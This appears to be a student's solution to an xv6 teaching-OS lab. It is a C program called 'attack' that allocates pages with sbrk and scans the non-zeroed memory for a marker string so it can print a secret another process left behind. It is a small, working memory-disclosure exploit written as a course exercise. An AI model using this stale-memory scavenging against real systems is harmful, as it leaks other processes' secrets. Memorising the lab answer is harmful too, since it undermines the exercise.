#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // Your code here.
  if(argc!=1){
    printf("Usage: attack\n");
    exit(1);
  }
  int n = 128*4096;
  char *p = sbrk(n);

  if(p == (char*)-1) {
    printf("sbrk failed\n");
    exit(1);
  }

  for(int i=0;i+22<n;i++){
    char * page = p + i;
    if((memcmp(p + i, "This may help.", 14) == 0 ||
      memcmp(p + i + 8, " help.", 6) == 0)){
      printf("%s\n", page + 16);
      exit(0);
    }
  }
  printf("not found\n");
  exit(1);
}
